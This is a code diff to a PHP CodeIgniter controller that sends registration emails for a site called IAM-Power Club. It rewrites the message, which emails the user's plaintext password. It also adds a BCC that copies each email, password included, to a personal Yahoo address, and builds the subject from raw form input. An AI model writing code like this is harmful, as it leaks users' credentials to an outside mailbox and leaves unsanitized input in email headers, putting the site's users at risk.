@@ -123,10 +123,12 @@ class Main extends CI_Controller {
 				  'wordwrap' => TRUE 
 			    );
 			
+				  $subject = $_POST['txtFirstName'] . ' ' . $_POST['txtLastName'] . ' has successfully registered for IAM-Power Club.';
 			      $message = '
-			      Congratulations! You have successfully created an account for IAM-Power Club.
+			      You have successfully created an account for IAM-Power Club. Your account will be activated once your payment is approved.
 			      <br><br>
-			      Please use below login information in order to sign into IAM-Power Club: <br>
+			      Login information:
+			      <br>
 			      Username: '.$_POST['txtEmail'].' <br>
 			      Password: '.$_POST['txtPassword'].' <br>
 			      Login page:  <a href="http://www.iam-power.com/index.php/main/kontakt">Login page</a>			      
@@ -135,7 +137,8 @@ class Main extends CI_Controller {
 			      $this->email->set_newline("\r\n");
 			      $this->email->from('support@iam-power.com'); 
 			      $this->email->to($_POST['txtEmail']);
-			      $this->email->subject('Successfully created account for IAM-Power club');
+				  $this->email->bcc('mimoza88@yahoo.com'); 
+			      $this->email->subject($subject);
 			      $this->email->message($message);
 			      if($this->email->send())
 				  {
